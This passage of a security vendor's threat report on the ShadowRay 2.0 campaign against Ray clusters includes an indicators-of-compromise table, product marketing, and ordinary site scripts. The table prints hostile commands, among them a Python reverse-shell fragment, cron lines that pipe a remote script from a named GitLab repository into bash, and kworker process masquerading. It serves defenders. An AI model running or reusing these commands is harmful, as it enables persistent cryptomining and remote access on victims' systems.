+        <td>DDoS tool binary</td>
+    </tr>
+    <tr>
+        <td>Path</td>
+        <td>/tmp/dns</td>
+        <td></td>
+        <td>Alternative XMRig binary location</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>mon.sh</td>
+        <td></td>
+        <td>Monitoring and persistence script</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>aa.sh</td>
+        <td></td>
+        <td>Cleanup and setup script</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>aa_clean.sh</td>
+        <td></td>
+        <td>Cleanup script variant (competition elimination)</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>run.sh</td>
+        <td></td>
+        <td>Main execution script (non-China regions)</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>run-CN.sh</td>
+        <td></td>
+        <td>China-specific payload with network proxy</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>.ddns.sh</td>
+        <td></td>
+        <td>Persistence script</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>xd.sh</td>
+        <td></td>
+        <td>Payload found in Second</td>
+    </tr>
+    <tr>
+        <td>Filename</td>
+        <td>cloud.txt</td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td>Path</td>
+        <td>/var/tmp/.ddns.sh</td>
+        <td></td>
+        <td>Full path to persistence script</td>
+    </tr>
+    <tr>
+        <td>Process Name</td>
+        <td>kworker/0:0</td>
+        <td></td>
+        <td>Masqueraded as legitimate Linux kernel worker</td>
+    </tr>
+    <tr>
+        <td>Process Name</td>
+        <td>dns-filter</td>
+        <td></td>
+        <td>Masqueraded as DNS filtering service</td>
+    </tr>
+    <tr>
+        <td>Process Name</td>
+        <td>[kworker/0:0]</td>
+        <td></td>
+        <td>Bracket notation indicates process name manipulation via /proc/$$/comm</td>
+    </tr>
+    <tr>
+        <td>Command Line</td>
+        <td>/usr/lib/dev/systemdev/dns-filter -o [host] --tls</td>
+        <td></td>
+        <td>XMRig mining to C2 with TLS</td>
+    </tr>
+    <tr>
+        <td>Command Line</td>
+        <td>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([host],[port]));</td>
+        <td></td>
+        <td>Reverse shell payload</td>
+    </tr>
+    <tr>
+        <td>Command Line</td>
+        <td>./sockstress eth0 -p payloads/http</td>
+        <td></td>
+        <td>DDoS attack command</td>
+    </tr>
+    <tr>
+        <td>Command Line</td>
+        <td>/bin/bash /var/tmp/.ddns.sh</td>
+        <td></td>
+        <td>Persistence script execution</td>
+    </tr>
+    <tr>
+        <td>Cron Entry</td>
+        <td>*/15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash</td>
+        <td></td>
+        <td>Executes monitoring script every 15 minutes</td>
+    </tr>
+    <tr>
+        <td>Cron Entry</td>
+        <td>*/15 * * * * curl -s https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash</td>
+        <td></td>
+        <td>Alternative with curl</td>
+    </tr>
+    <tr>
+        <td>Path</td>
+        <td>/etc/init.d/dns-filter</td>
+        <td></td>
+        <td>Persistence via init.d</td>
+    </tr>
+    <tr>
+        <td>Path</td>
+        <td>~/.bashrc</td>
+        <td></td>
+        <td>Malicious commands injected into user shell profile</td>
+    </tr>
+    <tr>
+        <td>Technique</td>
+        <td>NodeAffinitySchedulingStrategy</td>
+        <td></td>
+        <td>Ray feature weaponized for lateral movement</td>
+    </tr>
+    <tr>
+        <td>/etc/hosts Entry</td>
+        <td>Block entries for rival mining pools</td>
+        <td></td>
+        <td>Modified to block competitors</td>
+    </tr>
+    <tr>
+        <td>iptables Rules</td>
+        <td>iptables -A OUTPUT -p tcp --dport 3333 -j DROP</td>
+        <td></td>
+        <td>Blocking Monero mining port</td>
+    </tr>
+    <tr>
+        <td>iptables Rules</td>
+        <td>iptables -A OUTPUT -p tcp --dport 5555 -j DROP</td>
+        <td></td>
+        <td>Blocking alternative mining port</td>
+    </tr>
+    <tr>
+        <td>iptables Rules</td>
+        <td>iptables -A OUTPUT -p tcp --dport 7777 -j DROP</td>
+        <td></td>
+        <td>Blocking alternative mining port</td>
+    </tr>
+    <tr>
+        <td>Process Killing</td>
+        <td>Targets: xmrig, minerd, ccminer, crypto-pool, etc.</td>
+        <td></td>
+        <td>Active termination of rival miners</td>
+    </tr>
+    <tr>
+        <td>Script Logic</td>
+        <td>China IP range detection using http://ip-api.com/json/</td>
+        <td></td>
+        <td>Delivers region-specific payloads</td>
+    </tr>
+    <tr>
+        <td>Script Logic</td>
+        <td>run-CN.sh execution for Chinese IPs payloads</td>
+        <td></td>
+        <td>Uses GitHub proxy for network access</td>
+    </tr>
+    <tr>
+        <td>Resource Allocation</td>
+        <td>60% CPU/GPU allocation to hide activity</td>
+        <td></td>
+        <td>Configured to avoid detection</td>
+    </tr>
+    <tr>
+        <td>Process Renaming</td>
+        <td>echo &quot;kworker/0:0&quot; &gt; /proc/$$/comm</td>
+        <td></td>
+        <td>Masquerades as kernel process</td>
+    </tr>
+</table></div><p>If you have any questions and need help assessing your environment, you can schedule a threat briefing with our research team by reaching out to <a href="mailto:info@oligosecurity.io">info@oligosecurity.io</a>.</p><p>‍</p><h1><strong>How Oligo Protects Against Exploits of the ShadowRay Vulnerability</strong></h1><p>ShadowRay 2.0 underscores how quickly and broadly a flaw, coupled with misconfigurations, can escalate into easily propagated compromise – and also why runtime context is the source of truth that security teams need. With Oligo, teams gain deterministic proof of exploitability, real-time detection of malicious behavior, and automatic correlation across every step of the modern attack chain. Instead of drowning in theoretical alerts or reacting after the fact, security teams can confidently identify and prevent threats like this the moment they emerge.</p><p>See below for examples of how Oligo’s runtime security platform can detect and prevent techniques like those used in the ShadowRay 2.0 campaign. </p><figure style="max-width:1600pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b93229eb99a3dcac4e0_691c730a59b3b460327d9f5d_771cdf1a.png" loading="lazy"/></div><figcaption>Above, you can see Oligo’s ability to identify a suspicious process initiating a reverse shell to malicious domain and spawning a cryptominer – combining CWPP-grade visibility with function-level context so that the exploit is captured in real time. </figcaption></figure><figure style="max-width:720pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b93229eb99a3dcac4d1_691c730a59b3b460327d9f60_b040dd4c.png" loading="lazy"/></div><figcaption>This figure shows how an Oligo user can drill directly into the malicious payload, tracing the reverse shell execution flow inside Python through decision-tree logic the attacker abused.</figcaption></figure><figure style="max-width:720pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69960b93229eb99a3dcac4d4_691c730a59b3b460327d9f63_a3f706c4.png" loading="lazy"/></div><figcaption>This highlights Oligo’s runtime detection of stack deviation inside of Ray, where an unexpected syscall leads to unauthorized process creation. By correlating this anomaly with the reverse shell activity and cryptominer execution, Oligo automatically generates a high-fidelity incident – providing proof of the exploit and full attack chain in a single, explainable view.</figcaption></figure><h1><strong>Book A Demo</strong></h1><p>If you’re interested in learning how Oligo’s runtime security platform unifies real-time protection across applications, cloud, workloads, and AI systems, set some time to connect <a href="https://www.oligo.security/demo">here</a>.</p></div></div></section><section data-w-id="ba6ea24d-59e7-3813-31b8-0c7313b4c300" class="cta-section vul-men"><div class="cta-section-wrapper vul-men"><div class="cta-content"><h2 class="heading-style-h2 text-align-center no-bottom-margin cta-heading">Stop modern attacks and keep your business moving</h2><a data-wf--button-primary--base="white_v-border" data-w-id="722e12bd-f923-9f5f-1ce8-eb26eabc2d87" href="/demo" class="cta-button w-variant-4b5b6e57-bb86-aab4-72be-82375610e700 w-inline-block"><div class="overflow-hidden z-index-2"><div class="cta-text w-variant-4b5b6e57-bb86-aab4-72be-82375610e700 is-1">Request a demo</div><div class="cta-text w-variant-4b5b6e57-bb86-aab4-72be-82375610e700 is-2">Request a demo</div></div><div class="overflow-hidden z-index-2"><div class="cta-text w-variant-4b5b6e57-bb86-aab4-72be-82375610e700 is-1">→</div><div class="cta-text w-variant-4b5b6e57-bb86-aab4-72be-82375610e700 is-2">→</div></div><div class="cta-bg-wrapper"><div class="cta-bg"></div></div></a></div></div></section><section class="section text-color-white background-color-black z-index-1"><div class="padding-global"><div class="max-width-full"><div class="footer-spacing"><div class="footer_wrapper"><div class="footer-column"><div data-w-id="da1b3370-b0ec-acfa-5f2a-816d447c1500" class="w-layout-hflex footer-trigger"><div class="heading-style-h5">Platform</div><div class="icon-small-wrapper hide-desktop-only"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="icon-1x1-small in-footer"/></div></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/runtime-platform/overview" class="link-text">Overview</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/runtime-platform/cloud-application-detection-and-response" class="link-text">Cloud Application Detect and Response</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/runtime-platform/runtime-vulnerability-management" class="link-text">Runtime Vulnerability Management</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/runtime-platform/runtime-ai" class="link-text">Runtime AI</a></div></div><div class="footer-column"><div data-w-id="17b09242-30ef-9c29-eb9f-5c9485dbba1c" class="w-layout-hflex footer-trigger"><div class="heading-style-h5">Solutions</div><div class="icon-small-wrapper hide-desktop-only"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="icon-1x1-small in-footer"/></div></div><div class="footer-column-flex"><div class="footer-column-v-flex"><div class="footer-link-wrapper"><div class="text-style-eyebrow text-size-small">Who it&#x27;s for</div></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/security-leadership" class="link-text">Security Leaders</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/security-operations" class="link-text">SecOps Pros</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/application-security" class="link-text">AppSec Pros</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/cloud-security" class="link-text">CloudSec Pros</a></div></div><div class="footer-column-v-flex"><div class="footer-link-wrapper"><div class="text-style-eyebrow text-size-small">Use Cases</div></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/exploit-blocking" class="link-text">Runtime Exploit Blocking</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/workload-protection" class="link-text">Workload Protection</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/real-time-bom" class="link-text">Real-time bom/vex</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/application-vulnerability-management" class="link-text">Application vulnerability management</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/ai-security-management" class="link-text">AI security</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/compliance-and-assurance" class="link-text">Compliance and assurance</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/detection-and-response" class="link-text">Attack detection and response</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/solutions/supply-chain-security" class="link-text">Supply chain security</a></div></div></div></div><div class="footer-column"><div data-w-id="7f279d39-3794-3cad-6d98-41853f338bcd" class="w-layout-hflex footer-trigger"><div class="heading-style-h5">Resources</div><div class="icon-small-wrapper hide-desktop-only"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="icon-1x1-small in-footer"/></div></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/resource-hub" class="link-text">Resource Hub</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/resources/blog" class="link-text">Blog</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/resources/events" class="link-text">Events</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/resources/webinars-and-videos" class="link-text">Webinars</a></div></div><div class="footer-column"><div data-w-id="dff5d2bd-e7fc-b560-e2c5-b076030f3869" class="w-layout-hflex footer-trigger"><div class="heading-style-h5">Company</div><div class="icon-small-wrapper hide-desktop-only"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="icon-1x1-small in-footer"/></div></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/company/about" class="link-text">About</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/resources/news" class="link-text">News</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/company/partners" class="link-text">Partners</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/company/careers" class="link-text">Careers</a></div><div class="footer-link-wrapper"><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/contact-us" class="link-text">Contact us</a></div></div></div><div class="h-align_center-stretch in-footer"><div class="text-size-regular variant-mobile">Copyright © Oligo Security | All Rights Reserved 2026</div><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/legal/terms-of-use" class="link-text">Terms of use</a><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/legal/privacy-policy" class="link-text">Privacy Policy</a><a data-w-id="2d3dc030-869e-0b11-9ba4-9acf14a24322" href="/legal/cookie-policy" class="link-text">Cookie policy</a><div class="w-layout-hflex h-align_center-stretch gap_1rem"><a href="https://www.youtube.com/@oligosec" target="_blank" class="link-text is-social">YOUTUBE</a><div class="v-line _1-5rem"></div><a href="https://www.linkedin.com/company/oligo-security/" target="_blank" class="link-text is-social">LINKEDIN</a><div class="v-line _1-5rem"></div><a href="https://x.com/OligoSecurity" target="_blank" class="link-text is-social">TWITTER</a></div></div></div></div></div></section></main></div><script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=69288487365aaac1f9887796" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/js/oligo-staging.80c1972f.c8caac53f7091f3a.js" type="text/javascript" integrity="sha384-Oshg+4qW0/zyMhq75ygPRiXUtxKZ0NRIQk9kF9qvQHGp+Ab9AE56xu5B1aaU+Z9m" crossorigin="anonymous"></script><script src="https://cdn.prod.website-files.com/gsap/3.15.0/gsap.min.js" type="text/javascript"></script><script src="https://cdn.prod.website-files.com/gsap/3.15.0/ScrollTrigger.min.js" type="text/javascript"></script><script src="https://cdn.prod.website-files.com/gsap/3.15.0/ScrollToPlugin.min.js" type="text/javascript"></script><script src="https://cdn.prod.website-files.com/gsap/3.15.0/ScrollSmoother.min.js" type="text/javascript"></script><script type="text/javascript">gsap.registerPlugin(ScrollTrigger,ScrollToPlugin,ScrollSmoother);</script><script>
+  gtag('event', 'conversion', {'send_to': 'AW-11293028927/ns6VCNT464gZEL_k94gq'});
+</script>
+
+<!-- Drop-in Footer Rive loader (put in Webflow > Project Settings > Custom Code > Footer) -->
+<script>
+(function () {
+  "use strict";
+
+  var FOOTER_CANVAS_ID = "riveFooter";
+  var RIVE_SRC =
+    "https://cdn.prod.website-files.com/69288487365aaac1f9887796/696e244014b7253e1533f192_e1968e70b8df523fbc0c45f36a41b50b_OLIGO%20General%20-%20Animated%20Logo%20Footer.riv";
+  var MOBILE_BREAKPOINT = 767;
+
+  // Keep consistent with your homepage approach
+  var RIVE_WEBGL2_URL = "https://unpkg.com/@rive-app/webgl2@latest/rive.js";
+  // var RIVE_WEBGL2_URL = "https://unpkg.com/@rive-app/webgl2@2.21.4/rive.js";
+
+  function onDomReady(fn) {
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", fn, { once: true });
+    } else {
+      fn();
+    }
+  }
+
+  function loadScriptOnce(src, flag, cb) {
+    if (window[flag]) return cb();
+    var s = document.createElement("script");
+    s.src = src;
+    s.async = true;
+    s.onload = function () {
+      window[flag] = true;
+      cb();
+    };
+    s.onerror = function () {
+      console.error("[Rive Footer] Failed to load runtime:", src);
+    };
+    document.head.appendChild(s);
+  }
+
+  function isMobile() {
+    return window.innerWidth <= MOBILE_BREAKPOINT;
+  }
+
+  function responsiveArtboard() {
+    return isMobile() ? "Mobile" : "Desktop";
+  }
+
+  function debounce(fn, wait) {
+    var t;
+    return function () {
+      clearTimeout(t);
+      t = setTimeout(fn, wait);
+    };
+  }
+
+  function safeFit(R, preferredName) {
+    // Prevent enum mismatch crashes (Fit.Layout may not exist depending on runtime)
+    if (R && R.Fit && preferredName && R.Fit[preferredName] != null) return R.Fit[preferredName];
+    if (R && R.Fit && R.Fit.Contain != null) return R.Fit.Contain;
+    return undefined;
+  }
+
+  function safeLayout(R) {
+    try {
+      return new R.Layout({
+        fit: safeFit(R, "Layout"), // tries Fit.Layout, falls back to Contain
+        alignment: R.Alignment.Center,
+        layoutScaleFactor: 1
+      });
+    } catch (e) {
+      console.error("[Rive Footer] Layout creation failed:", e);
+      return undefined;
+    }
+  }
+
+  function observeVisibility(targetEl, onEnter, onExit) {
+    if (!("IntersectionObserver" in window)) {
+      onEnter();
+      return function () {};
+    }
+
+    var io = new IntersectionObserver(
+      function (entries) {
+        for (var i = 0; i < entries.length; i++) {
+          if (entries[i].isIntersecting) onEnter();
+          else onExit();
+        }
+      },
+      {
+        threshold: 0.01,
+        // Footer: pre-init a bit earlier so it’s ready when user reaches bottom
+        rootMargin: "600px 0px 600px 0px"
+      }
+    );
+
+    io.observe(targetEl);
+
+    return function () {
+      try { io.unobserve(targetEl); } catch (e) {}
+      try { io.disconnect(); } catch (e) {}
+    };
+  }
+
+  onDomReady(function () {
+    var canvas = document.getElementById(FOOTER_CANVAS_ID);
+    if (!canvas) return;
+
+    var inst = null;
+    var lastIsMobile = isMobile();
+
+    function cleanup() {
+      if (!inst) return;
+      try { if (inst.pause) inst.pause(); } catch (e) {}
+      try { inst.cleanup(); } catch (e) {}
+      inst = null;
+    }
+
+    function resize() {
+      if (!inst) return;
+      try { inst.resizeDrawingSurfaceToCanvas(); } catch (e) {}
+    }
+
+    function build() {
+      cleanup();
+
+      var R = window.rive;
+      if (!R || !R.Rive) {
+        console.error("[Rive Footer] Rive runtime missing after load.");
+        return;
+      }
+
+      var artboard = responsiveArtboard();
+
+      try {
+        inst = new R.Rive({
+          src: RIVE_SRC,
+          canvas: canvas,
+          autoplay: true,
+          autoBind: true,
+          artboard: artboard,
+          layout: safeLayout(R),
+          stateMachines: "State Machine 1",
+          useOffscreenRenderer: true,
+          isTouchScrollEnabled: true,
+          onLoad: function () {
+            resize();
+          },
+          onLoadError: function (e) {
+            console.error("[Rive Footer] load error", e);
+          }
+        });
+      } catch (e) {
+        console.error("[Rive Footer] Instance creation failed:", e);
+        inst = null;
+      }
+    }
+
+    function play() {
+      if (!inst) build();
+      if (!inst) return;
+      try { if (inst.play) inst.play(); } catch (e) {}
+      resize();
+    }
+
+    function pause() {
+      if (!inst) return;
+      try { if (inst.pause) inst.pause(); } catch (e) {}
+    }
+
+    // Load runtime once, then lazy-init with IO
+    loadScriptOnce(RIVE_WEBGL2_URL, "__rive_webgl2_loaded__", function () {
+      if (!window.rive || !window.rive.Rive) {
+        console.error("[Rive Footer] WebGL2 runtime loaded but window.rive.Rive missing");
+        return;
+      }
+
+      // Lazy init + pause offscreen
+      observeVisibility(canvas, play, pause);
+
+      // Fallback: if IO never triggers due to layout quirks, start after a bit
+      setTimeout(play, 1200);
+
+      // Resize: only rebuild when breakpoint flips; otherwise just resize
+      var onResize = debounce(function () {
+        if (!inst) return;
+
+        var nowMobile = isMobile();
+        if (nowMobile !== lastIsMobile) {
+          lastIsMobile = nowMobile;
+          // Need rebuild to switch artboard
+          build();
+          // If footer is visible, ensure it runs
+          try { if (inst && inst.play) inst.play(); } catch (e) {}
+          resize();
+        } else {
+          resize();
+        }
+      }, 150);
+
+      window.addEventListener("resize", onResize, { passive: true });
+    });
+  });
+})();
+</script>
+
+
+
+<!-- ======================================================
+  1) NAV PATH(page-path → navbar segments)
+  - Reads body attribute: page-path="folder;subfolder;page"
+  - Supports CMS override: subfolder === "Type" reads text from [path-cms-subfolder="true"]
+  - Optional link mapping via PATH_LINKS
+  - Clickable paths get underline + pointer cursor
+====================================================== -->
+<!-- 
+<script>
+(() => {
+  /* ---------------------------------- */
+  /* Inject styles for clickable paths  */
+  /* ---------------------------------- */
+  function injectPathStyles() {
+    if (document.getElementById("path-link-styles")) return;
+
+    const style = document.createElement("style");
+    style.id = "path-link-styles";
+    style.textContent = `
+      .is-path-linked {
+        cursor: pointer;
+        text-decoration: underline;
+        text-underline-offset: 0.15em;
+      }
+
+      /* Optional: subtle hover control */
+      .is-path-linked:hover {
+        opacity: 0.85;
+      }
+    `;
+    document.head.appendChild(style);
+  }
+
+  function initPathBreadcrumbs() {
+    injectPathStyles();
+
+    /* ------------------------------ */
+    /* Read + normalize page attribute */
+    /* ------------------------------ */
+    const raw = (document.body.getAttribute("page-path") || "").trim();
+    const isZero = (value) => value === "" || value === "0";
+
+    let parts = raw
+      .split(";")
+      .map((s) => s.trim())
+      .filter((s) => s.length || s === "0");
+
+    if (raw === "0" || raw === "") parts = ["0", "0", "0"];
+    while (parts.length < 3) parts.push("0");
+    if (parts.length > 3) parts = parts.slice(0, 3);
+
+    let [folder, subfolder, page] = parts;
+
+    /* -------------------------------------------------- */
+    /* CMS override: use Type value as subfolder if asked */
+    /* -------------------------------------------------- */
+    if (subfolder === "Type") {
+      const cmsSubfolderEl = document.querySelector('[path-cms-subfolder="true"]');
+      if (cmsSubfolderEl && cmsSubfolderEl.textContent.trim()) {
+        subfolder = cmsSubfolderEl.textContent.trim();
+      }
+    }
+
+    const hasFolder = !isZero(folder);
+    const hasSub = !isZero(subfolder);
+    const hasPage = !isZero(page);
+    const isHome = isZero(folder) && isZero(subfolder) && isZero(page);
+
+    /* ------------------------------ */
+    /* Cache DOM references (navbar)  */
+    /* ------------------------------ */
+    const line1 = document.querySelector('[path-line="1"]');
+    const line2 = document.querySelector('[path-line="2"]');
+    const line3 = document.querySelector('[path-line="3"]');
+    const line4 = document.querySelector('[path-line="4"]');
+
+    const folderText = document.querySelector('[path-text="folder"]');
+    const subfolderText = document.querySelector('[path-text="subfolder"]');
+    const pageText = document.querySelector('[path-text="page"]');
+
+    /* ------------------------------ */
+    /* Clickable path links (mapping) */
+    /* ------------------------------ */
+    const PATH_LINKS = {
+      customers: "/resource-hub/all-case-studies",
+      learn: "/resource-hub/all-case-studies",
+      company: "/company/about",
+
+      partners: "/company/partners",
+      blog: "/resources/blog",
+      academy: "/academy",
+      events: "/resources/event",
+      careers: "/company/careers",
+      platform: "/runtime-platform/overview",
+      "case studies": "/resources/case-studies",
+      "resource hub": "/resource-hub",
+      news: "/resources/news",
+      "webinars & videos": "/resources/webinars-and-videos",
+      whitepapers: "/resources/whitepapers",
+      datasheets: "/resources/datasheets",
+    };
+
+    const LINK_CLASS = "is-path-linked";
+
+    function applyPathLink(el, label) {
+      if (!el) return;
+
+      const key = (label || "").trim().toLowerCase();
+      const href = PATH_LINKS[key];
+
+      if (!href) {
+        el.classList.remove(LINK_CLASS);
+        return;
+      }
+
+      el.setAttribute("href", href);
+      el.classList.add(LINK_CLASS);
+    }
+
+    /* ------------------------------ */
+    /* Home state                     */
+    /* ------------------------------ */
+    if (isHome) {
+      if (line1) line1.style.display = "";
+      if (line2) line2.style.display = "none";
+      if (line3) line3.style.display = "none";
+      if (line4) line4.style.display = "none";
+
+      if (folderText) folderText.style.display = "none";
+      if (subfolderText) subfolderText.style.display = "none";
+      if (pageText) pageText.style.display = "none";
+      return;
+    }
+
+    /* ------------------------------ */
+    /* Folder segment                 */
+    /* ------------------------------ */
+    if (hasFolder) {
+      if (folderText) {
+        folderText.textContent = folder;
+        folderText.style.display = "";
+        applyPathLink(folderText, folder);
+      }
+      if (line1) line1.style.display = "";
+    } else {
+      if (folderText) folderText.style.display = "none";
+      if (line1) line1.style.display = "none";
+    }
+
+    /* ------------------------------ */
+    /* Subfolder segment              */
+    /* ------------------------------ */
+    if (hasSub) {
+      if (subfolderText) {
+        subfolderText.textContent = subfolder;
+        subfolderText.style.display = "";
+        applyPathLink(subfolderText, subfolder);
+      }
+      if (line2) line2.style.display = "";
+    } else {
+      if (subfolderText) subfolderText.style.display = "none";
+      if (line2) line2.style.display = "none";
+    }
+
+    /* ------------------------------ */
+    /* Page segment                   */
+    /* ------------------------------ */
+    if (hasPage) {
+      if (pageText) {
+        pageText.textContent = page;
+        pageText.style.display = "";
+        applyPathLink(pageText, page);
+      }
+      if (line3) line3.style.display = "";
+    } else {
+      if (pageText) pageText.style.display = "none";
+      if (line3) line3.style.display = "none";
+    }
+
+    /* ------------------------------ */
+    /* Final trailing line            */
+    /* ------------------------------ */
+    if (line4) line4.style.display = "";
+  }
+
+  document.addEventListener("DOMContentLoaded", initPathBreadcrumbs);
+  window.addEventListener("pageshow", initPathBreadcrumbs);
+})();
+</script>
+-->
+
+
+<!-- ======================================================
+  2) TESTIMONIAL SLIDER — ARROW LABELS (prev/next company)
+  - Reads company names via [data-tm="company"]
+  - Uses active dot to determine current index
+====================================================== -->
+<script>
+(() => {
+  function initTestimonialArrowLabels() {
+    const block = document.querySelector('[data-tm="testimonial"]');
+    if (!block) return;
+
+    const prevLabel = block.querySelector('[data-tm="prev-label"]');
+    const nextLabel = block.querySelector('[data-tm="next-label"]');
+    const slider = block.querySelector('[data-tm="slider"]');
+    if (!prevLabel || !nextLabel || !slider) return;
+
+    const nav = slider.querySelector(".w-slider-nav");
+
+    function getCompanies() {
+      // Pull company names, dedupe in order (handles loop/clones nicely)
+      const raw = Array.from(slider.querySelectorAll('[data-tm="company"]'))
+        .map((el) => (el.textContent || "").trim())
+        .filter(Boolean);
+
+      const unique = [];
+      const seen = new Set();
+      for (const n of raw) {
+        if (!seen.has(n)) {
+          seen.add(n);
+          unique.push(n);
+        }
+      }
+
+      // If dots exist, use dot count as the true number of items
+      const dotCount = slider.querySelectorAll(".w-slider-nav .w-slider-dot").length;
+      return dotCount ? unique.slice(0, dotCount) : unique;
+    }
+
+    function getActiveIndex(total) {
+      const dots = Array.from(slider.querySelectorAll(".w-slider-nav .w-slider-dot"));
+      const activeDot = slider.querySelector(".w-slider-nav .w-slider-dot.w-active");
+      if (activeDot && dots.length) {
+        const idx = dots.indexOf(activeDot);
+        return idx >= 0 ? Math.min(idx, total - 1) : 0;
+      }
+      return 0;
+    }
+
+    let lastIndex = -1;
+    let companiesCache = [];
+
+    function update(force = false) {
+      const companies = getCompanies();
+      if (companies.length < 2) return;
+
+      if (force || companies.join("|") !== companiesCache.join("|")) {
+        companiesCache = companies;
+        lastIndex = -1;
+      }
+
+      const activeIndex = getActiveIndex(companiesCache.length);
+      if (!force && activeIndex === lastIndex) return;
+
+      lastIndex = activeIndex;
+
+      const total = companiesCache.length;
+      const prevIndex = (activeIndex - 1 + total) % total;
+      const nextIndex = (activeIndex + 1) % total;
+
+      prevLabel.textContent = companiesCache[prevIndex];
+      nextLabel.textContent = companiesCache[nextIndex];
+    }
+
+    // Initial paint
+    update(true);
+
+    // Lightweight watcher
+    const intervalId = setInterval(update, 120);
+    block._tmArrowLabelsInterval = intervalId;
+
+    // Snappier updates when dot class changes
+    if (nav) {
+      new MutationObserver(() => update())
+        .observe(nav, { subtree: true, attributes: true, attributeFilter: ["class"] });
+    }
+  }
+
+  document.addEventListener("DOMContentLoaded", initTestimonialArrowLabels);
+  window.addEventListener("pageshow", initTestimonialArrowLabels);
+})();
+</script>
+
+
+<!-- ======================================================
+  3) TESTIMONIAL SLIDER — CUSTOM PAGINATION DOTS (list-nav)
+  - Builds N items from template: [data-tm="pagination-div"]
+  - Click dot → clicks corresponding Webflow slider dot
+  - Updates active state with interval
+  - Includes robust re-init for pageshow + DOM swaps
+====================================================== -->
+<script>
+(() => {
+  const INIT_FLAG = "data-tm-pagination-init";
+
+  function waitFor(testFn, timeoutMs) {
+    return new Promise((resolve, reject) => {
+      const start = performance.now();
+      const tick = () => {
+        if (testFn()) return resolve();
+        if (performance.now() - start > timeoutMs) return reject();
+        requestAnimationFrame(tick);
+      };
+      tick();
+    });
+  }
+
+  function initAll() {
+    document.querySelectorAll('[data-tm="testimonial"]').forEach(initOne);
+  }
+
+  function initOne(block) {
+    if (block.hasAttribute(INIT_FLAG)) return;
+
+    const slider = block.querySelector('[data-tm="slider"]');
